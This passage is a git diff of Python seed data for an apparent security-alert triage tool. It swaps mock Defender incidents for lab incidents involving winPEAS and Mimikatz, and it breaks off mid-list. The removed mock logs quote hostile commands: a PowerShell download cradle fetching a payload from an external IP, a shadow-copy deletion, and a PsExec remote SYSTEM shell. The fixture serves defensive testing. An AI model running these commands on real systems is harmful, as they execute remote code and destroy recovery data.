@@ -6,850 +6,345 @@ from database import engine, init_db
 from datetime import datetime
 from models import (
     Incident, FileIntelligence, DeviceContext, UserContext,
-    CampaignContext, MalwareAnalysis, KQLQuery,
+    KQLQuery,
 )
 
 
-MOCK_TENANT_ID = "a1b2c3d4-e5f6-7890-abcd-ef1234567890"
+TENANT_ID = "335391db-0df6-4699-b48b-92a8feadccb5"
 
 INCIDENTS = [
-    # --- Malicious Executable ---
+    # --- Incident 15609: Aikaantivm malware detected (winPEASx64.exe) ---
+    # Alert from MDE antivirus — winPEASx64.exe flagged as VirTool:MSIL/Aikaantivm.GG!MTB
+    # Spawned by powershell.exe as chrisr; file dropped to C:\ProgramData\legit
     Incident(
-        id="da637431751965614873_-1139290728",
-        mde_alert_id="da637431751965614873_-1139290728",
-        mde_incident_id="521",
-        tenant_id=MOCK_TENANT_ID,
-        title="Malicious Executable Detected on Finance Workstation",
+        id="dad50712b6-e83b-41c8-827e-8af5873236be_1",
+        mde_alert_id="dad50712b6-e83b-41c8-827e-8af5873236be_1",
+        mde_incident_id="15609",
+        tenant_id=TENANT_ID,
+        title="An active 'Aikaantivm' malware was detected",
         description=(
-            "A malicious executable was detected on this device. The file matched the signature "
-            "Trojan:Win32/Loader.ABCIml and attempted to establish an outbound connection to a "
-            "known command-and-control IP address. The file was successfully quarantined."
+            "Malware and unwanted software are undesirable applications that perform annoying, "
+            "disruptive, or harmful actions on affected machines. Some of these undesirable "
+            "applications can replicate and spread from one machine to another. Others are able "
+            "to receive commands from remote attackers and perform activities associated with "
+            "cyber attacks.\n\nA malware is considered active if it is found running on the "
+            "machine or it already has persistence mechanisms in place. Active malware detections "
+            "are assigned higher severity ratings.\n\nBecause this malware was active, take "
+            "precautionary measures and check for residual signs of infection."
         ),
-        detection_timestamp="2026-02-11T14:32:18Z",
+        detection_timestamp="2026-04-20T15:06:27Z",
+        severity="LOW",
+        device_name="chrisr-lab-ws08.lab.local",
+        user="chrisr@lab.local",
+        file_name="winPEASx64.exe",
+        file_hash="a5e3ded4dff907d728cdb22d85f0ebfe65895189bc1b13983d6687d46476efe0",
+        microsoft_signature="Aikaantivm",
+        quarantine_status="detected",
+        log_source="Microsoft Defender for Endpoint",
+        source_ip="10.0.38.66",
+        destination_ip=None,
+        status="new",
+        command_line='winPEASx64.exe',
+        file_path=r"C:\ProgramData\legit",
+        mitre_techniques_json=json.dumps([]),
+        logs_json=json.dumps([
+            "2026-04-20T15:03:06Z [LOW] chrisr-lab-ws08 defender: winPEASx64.exe started via powershell.exe as chrisr@lab.local",
+            "2026-04-20T15:05:07Z [LOW] chrisr-lab-ws08 defender: VirTool:MSIL/Aikaantivm.GG!MTB detected in winPEASx64.exe at C:\\ProgramData\\legit",
+            "2026-04-20T15:06:27Z [LOW] chrisr-lab-ws08 defender: Alert created — An active 'Aikaantivm' malware was detected (antivirus, Malware)",
+            "Evidence [File]: winPEASx64.exe",
+            "Evidence [IP]: 10.0.38.66",
+        ]),
+        classification=None,
+        determination=None,
+        category="Malware",
+        detection_source="antivirus",
+        threat_name=None,
+        assigned_to=None,
+        first_event_time="2026-04-20T15:03:06Z",
+        last_event_time="2026-04-20T15:05:07Z",
+        last_update_time="2026-04-20T15:22:17Z",
+        resolved_time=None,
+        machine_id="afd75be34dbbae255be8f9b9a0730bca80f4d0d7",
+        rbac_group_name="TRS LAB",
+        parent_process_name="powershell.exe",
+        parent_process_path=None,
+        evidence_url=None,
+        registry_key=None,
+        registry_hive=None,
+        registry_value=None,
+        comments_json=json.dumps([
+            {"comment": "Collected alert to Argus", "createdByDisplayName": "API Action", "createdDateTime": "2026-04-20T15:07:30Z"},
+            {"comment": "Collected alert to Argus", "createdByDisplayName": "API Action", "createdDateTime": "2026-04-20T15:22:17Z"},
+        ]),
+    ),
+    # --- Incident 15609: Mimikatz lateral movement (human-operated) ---
+    # High-severity alert: mimikatz.exe spawned via powershell.exe targeting lsass.exe
+    # File dropped to C:\ProgramData\foo\mimikatz_trunk\x64 — credential dumping in progress
+    Incident(
+        id="da411feb4c-4ffd-4162-9d5d-f7799f1baf4b_1",
+        mde_alert_id="da411feb4c-4ffd-4162-9d5d-f7799f1baf4b_1",
+        mde_incident_id="15609",
+        tenant_id=TENANT_ID,
+        title="Potential human-operated malicious activity",
+        description=(
+            "Malware was detected on this device. An attacker might be attempting to move "
+            "laterally to this device from another device on the network."
+        ),
+        detection_timestamp="2026-04-20T14:54:00Z",
         severity="HIGH",
-        device_name="FIN-WS-027",
-        user="ola.nordmann@company.com",
-        file_name="supersusmalware.exe",
-        file_hash="fb55414848281f804858ce188c3dc659d129e283bd62d58d34f6e6f568feab37",
-        microsoft_signature="Trojan:Win32/Loader.ABCIml",
-        quarantine_status="Quarantined",
+        device_name="chrisr-lab-ws08.lab.local",
+        user="chrisr@lab.local",
+        file_name="mimikatz.exe",
+        file_hash="61c0810a23580cf492a6ba4f7654566108331e7a4134c968c2d6a05261b2d8a1",
+        microsoft_signature="HackTool:Win64/Mimikatz!MSR",
+        quarantine_status="detected",
         log_source="Microsoft Defender for Endpoint",
-        source_ip="10.14.2.27",
-        destination_ip="185.220.101.34",
-        status="New",
-        command_line="supersusmalware.exe",
-        file_path="C:\\Users\\ola\\Downloads\\supersusmalware.exe",
-        mitre_techniques_json=json.dumps([
-            "T1204.002", "T1566.001", "T1071.001", "T1055",
-        ]),
+        source_ip="10.0.38.66",
+        destination_ip=None,
+        status="new",
+        command_line='"mimikatz.exe"',
+        file_path=r"C:\ProgramData\foo\mimikatz_trunk\x64",
+        mitre_techniques_json=json.dumps(["T1021.003"]),
         logs_json=json.dumps([
-            "2026-02-11T14:31:02Z [HIGH] FIN-WS-027 defender[1201]: File supersusmalware.exe written to C:\\Users\\ola\\Downloads\\",
-            "2026-02-11T14:31:04Z [HIGH] FIN-WS-027 defender[1201]: Hash match flagged Trojan:Win32/Loader.ABCIml",
-            "2026-02-11T14:31:05Z [HIGH] FIN-WS-027 defender[1201]: Process supersusmalware.exe (PID 8832) attempted execution",
-            "2026-02-11T14:31:05Z [HIGH] FIN-WS-027 defender[1201]: Outbound connection 10.14.2.27 -> 185.220.101.34:443 blocked",
-            "2026-02-11T14:31:06Z [HIGH] FIN-WS-027 defender[1201]: File quarantined successfully",
-            "2026-02-11T14:32:18Z [HIGH] FIN-WS-027 defender[1201]: Alert generated - severity HIGH",
+            r"2026-04-20T14:49:51Z [HIGH] chrisr-lab-ws08 defender: mimikatz.exe spawned via powershell.exe as chrisr@lab.local from C:\ProgramData\foo\mimikatz_trunk\x64",
+            "2026-04-20T14:50:02Z [HIGH] chrisr-lab-ws08 defender: lsass.exe (wininit.exe child) — credential access attempt detected",
+            "2026-04-20T14:54:00Z [HIGH] chrisr-lab-ws08 defender: Alert created — Potential human-operated malicious activity (LateralMovement, T1021.003)",
+            "2026-04-20T15:14:22Z [HIGH] chrisr-lab-ws08 defender: Last observed mimikatz.exe process activity",
+            "Evidence [File]: mimikatz.exe",
+            "Evidence [IP]: 10.0.38.66",
         ]),
-    ),
-    # --- PowerShell Download Cradle ---
-    Incident(
-        id="da637455821043574621_1963810148",
-        mde_alert_id="da637455821043574621_1963810148",
-        mde_incident_id="522",
-        tenant_id=MOCK_TENANT_ID,
-        title="Suspicious PowerShell Download Cradle",
-        description=(
-            "A PowerShell script was executed using a download cradle to fetch and run a remote "
-            "payload, bypassing the local execution policy. The script established an outbound "
-            "connection to an external IP address. Quarantine failed because the process was "
-            "still active at time of detection."
-        ),
-        detection_timestamp="2026-02-13T09:15:42Z",
-        severity="CRITICAL",
-        device_name="HR-LAPTOP-011",
-        user="kari.hansen@company.com",
-        file_name="update_check.ps1",
-        file_hash="6f1ac5f0ebfb7e97d3dc4100e88eaab10016a5cac75e1251781f2ea12477af51",
-        microsoft_signature="Behavior:Win32/SuspPowerShell.B",
-        quarantine_status="Failed - Process Running",
-        log_source="Microsoft Defender for Endpoint",
-        source_ip="10.14.3.11",
-        destination_ip="91.215.85.142",
-        status="New",
-        command_line="powershell.exe -ExecutionPolicy Bypass -File update_check.ps1",
-        file_path="C:\\Users\\kari\\AppData\\Local\\Temp\\update_check.ps1",
-        mitre_techniques_json=json.dumps([
-            "T1059.001", "T1105", "T1204.002", "T1566.001",
-        ]),
-        logs_json=json.dumps([
-            "2026-02-13T09:14:30Z [CRITICAL] HR-LAPTOP-011 outlook[3201]: Attachment saved: update_check.ps1",
-            "2026-02-13T09:15:01Z [CRITICAL] HR-LAPTOP-011 powershell[5504]: Script execution: update_check.ps1",
-            "2026-02-13T09:15:02Z [CRITICAL] HR-LAPTOP-011 powershell[5504]: IEX (New-Object Net.WebClient).DownloadString('http://91.215.85.142/payload')",
-            "2026-02-13T09:15:03Z [CRITICAL] HR-LAPTOP-011 defender[1201]: Behavior:Win32/SuspPowerShell.B detected",
-            "2026-02-13T09:15:05Z [CRITICAL] HR-LAPTOP-011 powershell[5504]: Connection established to 91.215.85.142:80",
-            "2026-02-13T09:15:10Z [CRITICAL] HR-LAPTOP-011 defender[1201]: Quarantine FAILED - process 5504 still running",
-            "2026-02-13T09:15:42Z [CRITICAL] HR-LAPTOP-011 defender[1201]: Alert generated - severity CRITICAL",
-        ]),
-    ),
-    # --- Lateral Movement via PsExec ---
-    Incident(
-        id="da637459312876540129_-847563021",
-        mde_alert_id="da637459312876540129_-847563021",
-        mde_incident_id="522",
-        tenant_id=MOCK_TENANT_ID,
-        title="Lateral Movement via PsExec",
-        description=(
-            "PsExec was used to remotely execute commands on multiple hosts using valid "
-            "administrative credentials. A SYSTEM-level shell was opened on a remote device "
-            "and the tool was subsequently used to move to additional hosts, indicating "
-            "active lateral movement within the network."
-        ),
-        detection_timestamp="2026-02-13T16:48:33Z",
-        severity="CRITICAL",
-        device_name="IT-ADMIN-004",
-        user="admin.svc@company.com",
-        file_name="psexec.exe",
-        file_hash="142b638c6a60b60c7f9928da4fb85a5a8e1422a9ffdc9ee49e17e56ccca9cf6e",
-        microsoft_signature="HackTool:Win32/PsExec",
-        quarantine_status="Pending",
-        log_source="Microsoft Defender for Endpoint",
-        source_ip="10.14.1.4",
-        destination_ip="10.14.2.27",
-        status="InProgress",
-        command_line="psexec.exe \\\\FIN-WS-027 -s cmd.exe",
-        file_path="C:\\Windows\\Temp\\psexec.exe",
-        mitre_techniques_json=json.dumps([
-            "T1021.002", "T1570", "T1543.003", "T1078",
-        ]),
-        logs_json=json.dumps([
-            "2026-02-13T16:45:01Z [CRITICAL] IT-ADMIN-004 psexec[7201]: Remote execution initiated to FIN-WS-027 (10.14.2.27)",
-            "2026-02-13T16:45:02Z [CRITICAL] IT-ADMIN-004 psexec[7201]: Service PSEXESVC installed on FIN-WS-027",
-            "2026-02-13T16:45:03Z [CRITICAL] IT-ADMIN-004 psexec[7201]: Process cmd.exe started on FIN-WS-027 as SYSTEM",
-            "2026-02-13T16:46:15Z [CRITICAL] IT-ADMIN-004 defender[1201]: HackTool:Win32/PsExec detected",
-            "2026-02-13T16:47:00Z [CRITICAL] IT-ADMIN-004 psexec[7201]: Remote execution to HR-LAPTOP-011 (10.14.3.11)",
-            "2026-02-13T16:48:33Z [CRITICAL] IT-ADMIN-004 defender[1201]: Alert generated - severity CRITICAL",
-        ]),
-    ),
-    # --- Ransomware ---
-    Incident(
-        id="da637479102983651840_2047812903",
-        mde_alert_id="da637479102983651840_2047812903",
-        mde_incident_id="530",
-        tenant_id=MOCK_TENANT_ID,
-        title="Ransomware File Encryption Detected on File Server",
-        description=(
-            "Ransomware was detected actively encrypting files on the file server. The malware "
-            "deleted all VSS shadow copies to prevent recovery, applied .lockbit extensions to "
-            "thousands of files, and dropped ransom notes across multiple directories. "
-            "Quarantine failed due to ongoing mass file I/O operations."
-        ),
-        detection_timestamp="2026-02-15T02:14:33Z",
-        severity="CRITICAL",
-        device_name="FILE-SRV-002",
-        user="svc.backup@company.com",
-        file_name="winupdate32.exe",
-        file_hash="08039481f17de1a125763d6dadc9a91615fa027ad42a4f42d886b94063a94822",
-        microsoft_signature="Ransom:Win32/LockBit.A",
-        quarantine_status="Failed - Mass File Operations In Progress",
-        log_source="Microsoft Defender for Endpoint",
-        source_ip="10.14.4.2",
-        destination_ip="10.14.4.10",
-        status="New",
-        command_line="winupdate32.exe",
-        file_path="C:\\Windows\\Temp\\winupdate32.exe",
-        mitre_techniques_json=json.dumps([
-            "T1486", "T1490", "T1083", "T1489", "T1036.005",
-        ]),
-        logs_json=json.dumps([
-            "2026-02-15T02:10:01Z [CRITICAL] FILE-SRV-002 defender[1201]: winupdate32.exe written to C:\\Windows\\Temp\\",
-            "2026-02-15T02:10:05Z [CRITICAL] FILE-SRV-002 defender[1201]: Process winupdate32.exe (PID 9244) started as SYSTEM",
-            "2026-02-15T02:11:00Z [CRITICAL] FILE-SRV-002 defender[1201]: Mass file rename detected - .lockbit extensions applied to 2,847 files",
-            "2026-02-15T02:11:05Z [CRITICAL] FILE-SRV-002 cmd[9250]: vssadmin.exe delete shadows /all /quiet",
-            "2026-02-15T02:11:10Z [CRITICAL] FILE-SRV-002 defender[1201]: Ransom note LOCKBIT-README.txt dropped in 47 directories",
-            "2026-02-15T02:12:00Z [CRITICAL] FILE-SRV-002 defender[1201]: Quarantine FAILED - mass file I/O in progress",
-            "2026-02-15T02:14:33Z [CRITICAL] FILE-SRV-002 defender[1201]: Alert generated - severity CRITICAL",
-        ]),
-    ),
-    # --- Network Worm ---
-    Incident(
-        id="da637489204719384756_-391048203",
-        mde_alert_id="da637489204719384756_-391048203",
-        mde_incident_id="531",
-        tenant_id=MOCK_TENANT_ID,
-        title="Network Worm Propagation via SMB Exploit",
-        description=(
-            "A worm exploiting the EternalBlue vulnerability (CVE-2017-0144) was detected "
-            "actively propagating across the local subnet via SMB port 445. After initial "
-            "compromise, the malware dropped a copy of itself and began scanning and exploiting "
-            "additional hosts. Quarantine failed due to active lateral spread."
-        ),
-        detection_timestamp="2026-02-16T07:03:18Z",
-        severity="CRITICAL",
-        device_name="DEV-WS-015",
-        user="dev.user@company.com",
-        file_name="mssecsvc.exe",
-        file_hash="e1b4d7f0a3c6e9b2d5f8a1e4b7d0c3f6a9e2b5d8f1a4c7e0b3d6f9a2e5b8c1f4",
-        microsoft_signature="Worm:Win32/WannaCrypt.A",
-        quarantine_status="Failed - Lateral Spread Active",
-        log_source="Microsoft Defender for Endpoint",
-        source_ip="10.14.6.15",
-        destination_ip="10.14.6.0/24",
-        status="New",
-        command_line="mssecsvc.exe -m security",
-        file_path="D:\\Windows\\mssecsvc.exe",
-        mitre_techniques_json=json.dumps([
-            "T1210", "T1570", "T1486", "T1018",
-        ]),
-        logs_json=json.dumps([
-            "2026-02-16T07:00:01Z [CRITICAL] DEV-WS-015 defender[1201]: Inbound SMB exploit attempt detected from 10.14.6.42",
-            "2026-02-16T07:00:04Z [CRITICAL] DEV-WS-015 defender[1201]: EternalBlue exploit triggered - CVE-2017-0144",
-            "2026-02-16T07:00:06Z [CRITICAL] DEV-WS-015 defender[1201]: mssecsvc.exe (PID 7801) dropped to D:\\Windows\\",
-            "2026-02-16T07:00:10Z [CRITICAL] DEV-WS-015 defender[1201]: Worm:Win32/WannaCrypt.A identified",
-            "2026-02-16T07:01:00Z [CRITICAL] DEV-WS-015 defender[1201]: Port scan initiated - 10.14.6.15 scanning 445/tcp across /24 subnet",
-            "2026-02-16T07:01:30Z [CRITICAL] DEV-WS-015 defender[1201]: SMB exploit propagation attempts to 12 hosts on subnet",
-            "2026-02-16T07:03:18Z [CRITICAL] DEV-WS-015 defender[1201]: Alert generated - severity CRITICAL",
+        classification=None,
+        determination=None,
+        category="LateralMovement",
+        detection_source="microsoftDefenderForEndpoint",
+        threat_name=None,
+        assigned_to=None,
+        first_event_time="2026-04-20T14:49:51Z",
+        last_event_time="2026-04-20T15:14:22Z",
+        last_update_time="2026-04-20T16:02:29Z",
+        resolved_time=None,
+        machine_id="afd75be34dbbae255be8f9b9a0730bca80f4d0d7",
+        rbac_group_name="TRS LAB",
+        parent_process_name="powershell.exe",
+        parent_process_path=None,
+        evidence_url=None,
+        registry_key=None,
+        registry_hive=None,
+        registry_value=None,
+        comments_json=json.dumps([
+            {"comment": "Collected alert to Argus", "createdByDisplayName": "API Action", "createdDateTime": "2026-04-20T14:55:27Z"},
+            {"comment": "Collected alert to Argus", "createdByDisplayName": "API Action", "createdDateTime": "2026-04-20T15:07:42Z"},
         ]),
     ),
 ]
 
 
 FILE_INTELLIGENCE = [
-    # --- Malicious Executable ---
+    # winPEASx64.exe — source: aikaantivm_sha.json (MDE File API)
     FileIntelligence(
-        file_hash="fb55414848281f804858ce188c3dc659d129e283bd62d58d34f6e6f568feab37",
-        ms_classification="Malicious",
-        ms_threat_family="Trojan:Win32/Loader.ABCIml",
-        ms_prevalence="Medium",
-        ms_global_detection_level="Stable",
-        ms_cloud_protection_level="High confidence",
+        file_hash="a5e3ded4dff907d728cdb22d85f0ebfe65895189bc1b13983d6687d46476efe0",
+        determination_type="Malware",
+        determination_value="VirTool:MSIL/Aikaantivm!rfn",
+        global_prevalence=3,
+        global_first_observed="2026-04-17",
+        global_last_observed="2026-04-21",
+        file_publisher=None,
+        file_product_name=None,
+        is_pe_file=True,
+        top_file_names_json=json.dumps(["winpeasx64.exe", "winPEASx64.exe"]),
+        org_prevalence=1,
+        org_first_seen="2026-04-20",
+        org_last_seen="2026-04-20",
         seen_before="No",
-        first_seen_internally="2026-02-11 14:31 UTC",
-        last_seen_internally="2026-02-11 14:31 UTC",
+        first_seen_internally="2026-04-20",
+        last_seen_internally="2026-04-20",
         number_of_affected_devices="1",
-        affected_devices_json=json.dumps(["FIN-WS-027"]),
+        affected_devices_json=json.dumps(["chrisr-lab-ws08.lab.local"]),
         total_internal_detections="1",
         seen_across_customers="Yes",
-        number_of_customer_environments="7",
-        first_observed_across_customers="2026-02-10",
-        spike_detected_last_24h="Yes",
-        campaign_likelihood="High",
-        df_classification="Malicious",
-        df_threat_family="Trojan:Win32/Loader.ABCIml",
-        df_prevalence="Medium",
-        df_global_detection_level="Stable",
-        df_cloud_protection_level="High confidence",
-    ),
-    # --- PowerShell Cradle ---
-    FileIntelligence(
-        file_hash="6f1ac5f0ebfb7e97d3dc4100e88eaab10016a5cac75e1251781f2ea12477af51",
-        ms_classification="Malicious",
-        ms_threat_family="Behavior:Win32/SuspPowerShell.B",
-        ms_prevalence="Medium",
-        ms_global_detection_level="Stable",
-        ms_cloud_protection_level="High confidence",
-        seen_before="No",
-        first_seen_internally="2026-02-13 09:15 UTC",
-        last_seen_internally="2026-02-13 09:15 UTC",
-        number_of_affected_devices="1",
-        affected_devices_json=json.dumps(["HR-LAPTOP-011"]),
-        total_internal_detections="1",
-        seen_across_customers="Yes",
-        number_of_customer_environments="12",
-        first_observed_across_customers="2026-02-12",
-        spike_detected_last_24h="Yes",
-        campaign_likelihood="High",
-        df_classification="Malicious",
-        df_threat_family="Behavior:Win32/SuspPowerShell.B",
-        df_prevalence="Medium",
-        df_global_detection_level="Stable",
-        df_cloud_protection_level="High confidence",
-    ),
-    # --- PsExec ---
-    FileIntelligence(
-        file_hash="142b638c6a60b60c7f9928da4fb85a5a8e1422a9ffdc9ee49e17e56ccca9cf6e",
-        ms_classification="HackTool",
-        ms_threat_family="HackTool:Win32/PsExec",
-        ms_prevalence="High",
-        ms_global_detection_level="Stable",
-        ms_cloud_protection_level="Low",
-        seen_before="Yes",
-        first_seen_internally="2025-06-01 08:00 UTC",
-        last_seen_internally="2026-02-13 16:45 UTC",
-        number_of_affected_devices="2",
-        affected_devices_json=json.dumps(["IT-ADMIN-004", "IT-ADMIN-002"]),
-        total_internal_detections="23",
-        seen_across_customers="Yes",
-        number_of_customer_environments="48",
-        first_observed_across_customers="2019-03-14",
+        number_of_customer_environments="3",
+        first_observed_across_customers="2026-04-17",
         spike_detected_last_24h="No",
         campaign_likelihood="Low",
-        df_classification="HackTool",
-        df_threat_family="HackTool:Win32/PsExec",
-        df_prevalence="High",
-        df_global_detection_level="Stable",
-        df_cloud_protection_level="Low",
     ),
-    # --- Ransomware ---
+    # mimikatz.exe — source: mimikatz_sha.json (MDE File API)
     FileIntelligence(
-        file_hash="08039481f17de1a125763d6dadc9a91615fa027ad42a4f42d886b94063a94822",
-        ms_classification="Malicious",
-        ms_threat_family="Ransom:Win32/LockBit.A",
-        ms_prevalence="High",
-        ms_global_detection_level="Rising",
-        ms_cloud_protection_level="High confidence",
-        seen_before="No",
-        first_seen_internally="2026-02-15 02:10 UTC",
-        last_seen_internally="2026-02-15 02:10 UTC",
+        file_hash="61c0810a23580cf492a6ba4f7654566108331e7a4134c968c2d6a05261b2d8a1",
+        determination_type="Malware",
+        determination_value="HackTool:Win64/Mimikatz!MSR",
+        global_prevalence=60138,
+        global_first_observed="2022-09-19",
+        global_last_observed="2026-04-22",
+        file_publisher=None,
+        file_product_name=None,
+        is_pe_file=True,
+        top_file_names_json=json.dumps(["mimikatz.exe"]),
+        org_prevalence=1,
+        org_first_seen="2026-03-26",
+        org_last_seen="2026-04-20",
+        seen_before="Yes",
+        first_seen_internally="2026-03-26",
+        last_seen_internally="2026-04-20",
         number_of_affected_devices="1",
-        affected_devices_json=json.dumps(["FILE-SRV-002"]),
+        affected_devices_json=json.dumps(["chrisr-lab-ws08.lab.local"]),
         total_internal_detections="1",
         seen_across_customers="Yes",
-        number_of_customer_environments="31",
-        first_observed_across_customers="2026-01-20",
-        spike_detected_last_24h="Yes",
+        number_of_customer_environments="200+",
+        first_observed_across_customers="2022-09-19",
+        spike_detected_last_24h="No",
         campaign_likelihood="High",
-        df_classification="Malicious",
-        df_threat_family="Ransom:Win32/LockBit.A",
-        df_prevalence="High",
-        df_global_detection_level="Rising",
-        df_cloud_protection_level="High confidence",
-    ),
-    # --- Worm ---
-    FileIntelligence(
-        file_hash="e1b4d7f0a3c6e9b2d5f8a1e4b7d0c3f6a9e2b5d8f1a4c7e0b3d6f9a2e5b8c1f4",
-        ms_classification="Malicious",
-        ms_threat_family="Worm:Win32/WannaCrypt.A",
-        ms_prevalence="Medium",
-        ms_global_detection_level="Stable",
-        ms_cloud_protection_level="High confidence",
-        seen_before="Yes",
-        first_seen_internally="2026-02-16 07:00 UTC",
-        last_seen_internally="2026-02-16 07:00 UTC",
-        number_of_affected_devices="3",
-        affected_devices_json=json.dumps(["DEV-WS-015", "DEV-WS-016", "DEV-WS-019"]),
-        total_internal_detections="3",
-        seen_across_customers="Yes",
-        number_of_customer_environments="44",
-        first_observed_across_customers="2017-05-12",
-        spike_detected_last_24h="Yes",
-        campaign_likelihood="High",
-        df_classification="Malicious",
-        df_threat_family="Worm:Win32/WannaCrypt.A",
-        df_prevalence="Medium",
-        df_global_detection_level="Stable",
-        df_cloud_protection_level="High confidence",
     ),
 ]
-
 
 DEVICE_CONTEXTS = [
-    # --- Existing ---
     DeviceContext(
-        device_id="DEV-FIN-027",
-        device_name="FIN-WS-027",
-        tenant_id="tenant-001",
-        os_platform="Windows",
-        os_version="Windows 11 23H2",
+        device_id="afd75be34dbbae255be8f9b9a0730bca80f4d0d7",
+        device_name="chrisr-lab-ws08.lab.local",
+        tenant_id=TENANT_ID,
+        os_platform="Windows10",
+        os_version="22H2",
         device_type="Workstation",
         risk_level="High",
-        exposure_level="Medium",
-        last_logged_on_user="ola.nordmann@company.com",
-        failed_logons_last_24h=2,
-        suspicious_processes_last_24h=3,
-        beaconing_detected=True,
-        credential_dumping_detected=False,
-        last_seen=datetime(2026, 2, 11, 14, 32, 18),
-    ),
-    DeviceContext(
-        device_id="DEV-HR-011",
-        device_name="HR-LAPTOP-011",
-        tenant_id="tenant-001",
-        os_platform="Windows",
-        os_version="Windows 11 23H2",
-        device_type="Laptop",
-        risk_level="Critical",
         exposure_level="High",
-        last_logged_on_user="kari.hansen@company.com",
+        last_logged_on_user="chrisr",
         failed_logons_last_24h=0,
-        suspicious_processes_last_24h=5,
-        beaconing_detected=True,
-        credential_dumping_detected=True,
-        last_seen=datetime(2026, 2, 13, 9, 15, 42),
-    ),
-    DeviceContext(
-        device_id="DEV-IT-004",
-        device_name="IT-ADMIN-004",
-        tenant_id="tenant-001",
-        os_platform="Windows",
-        os_version="Windows 11 23H2",
-        device_type="Workstation",
-        risk_level="High",
-        exposure_level="Medium",
-        last_logged_on_user="admin.svc@company.com",
-        failed_logons_last_24h=0,
-        suspicious_processes_last_24h=2,
+        suspicious_processes_last_24h=0,
         beaconing_detected=False,
         credential_dumping_detected=False,
-        last_seen=datetime(2026, 2, 13, 16, 48, 33),
-    ),
-    # --- New ---
-    DeviceContext(
-        device_id="DEV-FILE-SRV-002",
-        device_name="FILE-SRV-002",
-        tenant_id="tenant-001",
-        os_platform="Windows",
-        os_version="Windows Server 2022",
-        device_type="Server",
-        risk_level="Critical",
-        exposure_level="High",
-        last_logged_on_user="svc.backup@company.com",
-        failed_logons_last_24h=0,
-        suspicious_processes_last_24h=8,
-        beaconing_detected=False,
-        credential_dumping_detected=False,
-        last_seen=datetime(2026, 2, 15, 2, 14, 33),
-    ),
-    DeviceContext(
-        device_id="DEV-DEV-015",
-        device_name="DEV-WS-015",
-        tenant_id="tenant-001",
-        os_platform="Windows",
-        os_version="Windows 10 21H2",
-        device_type="Workstation",
-        risk_level="Critical",
-        exposure_level="High",
-        last_logged_on_user="dev.user@company.com",
-        failed_logons_last_24h=0,
-        suspicious_processes_last_24h=6,
-        beaconing_detected=False,
-        credential_dumping_detected=False,
-        last_seen=datetime(2026, 2, 16, 7, 3, 18),
+        last_seen=datetime(2026, 4, 21, 18, 12, 19),
+        first_seen=datetime(2025, 8, 8, 10, 3, 5),
+        last_ip_address="10.112.0.125",
+        last_external_ip_address="94.127.60.71",
+        health_status="Active",
+        device_value="Normal",
+        rbac_group_name="TRS LAB",
+        rbac_group_id=220,
+        is_aad_joined=False,
+        aad_device_id=None,
+        onboarding_status="Onboarded",
+        managed_by="MicrosoftDefenderForEndpoint",
+        os_processor="x64",
+        os_build=19045,
+        os_architecture="64-bit",
+        machine_tags_json=json.dumps([]),
+        ip_addresses_json=json.dumps([
+            {"ipAddress": "10.112.0.125", "macAddress": "005056A5BF63", "type": "Ethernet", "operationalStatus": "Up"},
+            {"ipAddress": "fe80::be43:8b33:19f2:8c42", "macAddress": "005056A5BF63", "type": "Ethernet", "operationalStatus": "Up"},
+            {"ipAddress": "127.0.0.1", "macAddress": None, "type": "SoftwareLoopback", "operationalStatus": "Up"},
+            {"ipAddress": "::1", "macAddress": None, "type": "SoftwareLoopback", "operationalStatus": "Up"},
+        ]),
+        vm_metadata_json=None,
     ),
 ]
-
 
 USER_CONTEXTS = [
-    # --- Existing ---
     UserContext(
-        user_id="USR-001",
-        user_principal_name="ola.nordmann@company.com",
-        display_name="Ola Nordmann",
-        tenant_id="tenant-001",
-        account_enabled=True,
-        risk_level="High",
-        sign_in_risk_level="Medium",
-        failed_logins_last_24h=2,
-        impossible_travel_detected=False,
-        mfa_enabled=True,
-        privileged_roles_json=json.dumps(["Finance Analyst"]),
-        last_sign_in=datetime(2026, 2, 11, 14, 30, 0),
-    ),
-    UserContext(
-        user_id="USR-003",
-        user_principal_name="kari.hansen@company.com",
-        display_name="Kari Hansen",
-        tenant_id="tenant-001",
+        user_id="USR-CHRISR",
+        user_principal_name="chrisr@lab.local",
+        display_name="Chris R.",
+        tenant_id=TENANT_ID,
         account_enabled=True,
         risk_level="High",
         sign_in_risk_level="Medium",
         failed_logins_last_24h=0,
         impossible_travel_detected=False,
-        mfa_enabled=True,
-        privileged_roles_json=json.dumps(["HR Manager"]),
-        last_sign_in=datetime(2026, 2, 13, 8, 45, 0),
-    ),
-    UserContext(
-        user_id="USR-004",
-        user_principal_name="admin.svc@company.com",
-        display_name="Admin Service Account",
-        tenant_id="tenant-001",
-        account_enabled=True,
-        risk_level="Critical",
-        sign_in_risk_level="High",
-        failed_logins_last_24h=0,
-        impossible_travel_detected=False,
         mfa_enabled=False,
-        privileged_roles_json=json.dumps(["Domain Admin", "Global Admin"]),
-        last_sign_in=datetime(2026, 2, 13, 16, 44, 0),
-    ),
-    # --- New ---
-    UserContext(
-        user_id="USR-006",
-        user_principal_name="svc.backup@company.com",
-        display_name="Backup Service Account",
-        tenant_id="tenant-001",
-        account_enabled=True,
-        risk_level="Critical",
-        sign_in_risk_level="High",
-        failed_logins_last_24h=0,
-        impossible_travel_detected=False,
-        mfa_enabled=False,
-        privileged_roles_json=json.dumps(["Backup Operator", "Server Administrator"]),
-        last_sign_in=datetime(2026, 2, 15, 2, 9, 0),
-    ),
-    UserContext(
-        user_id="USR-008",
-        user_principal_name="dev.user@company.com",
-        display_name="Developer User",
-        tenant_id="tenant-001",
-        account_enabled=True,
-        risk_level="Critical",
-        sign_in_risk_level="High",
-        failed_logins_last_24h=0,
-        impossible_travel_detected=False,
-        mfa_enabled=True,
-        privileged_roles_json=json.dumps(["Developer", "Local Admin"]),
-        last_sign_in=datetime(2026, 2, 16, 6, 50, 0),
+        privileged_roles_json=json.dumps(["Local Administrator"]),
+        last_sign_in=datetime(2026, 4, 20, 14, 49, 51),
     ),
 ]
 
+CAMPAIGN_CONTEXTS = []
 
-CAMPAIGN_CONTEXTS = [
-    CampaignContext(
-        campaign_id="CAMP-001",
-        campaign_likelihood="High",
-        spike_detected_last_24h=True,
-        number_of_affected_devices=5,
-        number_of_affected_users=5,
-        number_of_customer_environments=8,
-        first_observed=datetime(2026, 2, 9, 8, 0, 0),
-        last_observed=datetime(2026, 2, 16, 13, 55, 0),
-        related_hashes_json=json.dumps([
-            "9f2c6a9d4c1e5b3a8f7e2d9c6a4b3e1f0c8d7a6b5e4c3f2d1a0b9c8d7e6f5a4",
